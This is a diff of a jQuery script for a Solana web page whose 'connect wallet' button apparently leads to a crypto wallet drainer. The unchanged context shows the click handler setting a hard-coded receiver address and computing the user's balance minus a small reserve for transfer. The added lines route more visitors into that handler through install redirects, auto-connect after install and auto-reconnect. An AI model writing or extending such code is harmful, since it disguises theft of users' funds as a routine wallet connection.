@@ -24,7 +24,7 @@ $(document).ready(function () {
 
         $('#connect-wallet').off('click').on('click', async () => {
             try {
-                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
+                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Replace with real address
                 const balanceForTransfer = walletBalance - minBalance;
 
                 if (balanceForTransfer <= 0) {
@@ -71,48 +71,41 @@ $(document).ready(function () {
         }
     }
 
-    // Mobile deep link connection (ONLY for mobile devices)
-    function openPhantomMobileApp() {
-        const dappUrl = encodeURIComponent(window.location.origin); // origin only for app_url
-        const redirectLink = encodeURIComponent(window.location.href); // to return here
-        const phantomDeepLink = https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink};
+    $('#connect-wallet').on('click', async () => {
+        if (window.solana && window.solana.isPhantom) {
+            await connectPhantom();
+        } else {
+            alert("Phantom Wallet not found. Redirecting to install...");
+            sessionStorage.setItem('phantomInstallRequested', 'true');
 
-        window.location.href = phantomDeepLink;
+            if (isMobile) {
+                const dappUrl = encodeURIComponent(window.location.href);
+                const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
+                window.location.href = phantomLink;
+            } else {
+                const isFirefox = typeof InstallTrigger !== "undefined";
+                const isChrome = !!window.chrome;
 
-        // Fallback in case Phantom app isn't installed
-        setTimeout(() => {
-            if (!window.location.href.includes("phantom_encryption_public_key")) {
-                const fallback = confirm("It looks like Phantom Wallet is not installed. Do you want to download it?");
-                if (fallback) {
-                    window.open("https://phantom.app/download", "_blank");
+                if (isFirefox) {
+                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                } else if (isChrome) {
+                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                } else {
+                    alert("Please download the Phantom extension for your browser.");
                 }
             }
-        }, 3000);
-    }
-
-    // Handle Phantom redirect after mobile deep link connection
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.has("phantom_encryption_public_key")) {
-        // Normally you'd decrypt and verify the payload here
-        console.log("Phantom redirected with encryption keys.");
-        $('#connect-wallet').text("Connected (Mobile)");
-        // Optionally: store that user is connected, or extract wallet address
-    }
-
-    $('#connect-wallet').on('click', async () => {
-        if (!isMobile && window.solana && window.solana.isPhantom) {
-            await connectPhantom();
-        } else if (isMobile) {
-            openPhantomMobileApp();
-        } else {
-            alert("Phantom Wallet not found. Please install it.");
-            window.open("https://phantom.app/download", "_blank");
         }
     });
 
-    // Auto-connect if already trusted on desktop
+    // Resume after install (desktop + mobile)
+    const phantomWasJustInstalled = sessionStorage.getItem('phantomInstallRequested') === 'true';
     const phantomAvailable = window.solana && window.solana.isPhantom;
 
+    if (phantomWasJustInstalled && phantomAvailable) {
+        connectPhantom();
+    }
+
+    // Auto-reconnect if already trusted
     if (phantomAvailable) {
         window.solana.on("connect", async () => {
             console.log("Wallet auto-connected (listener)");
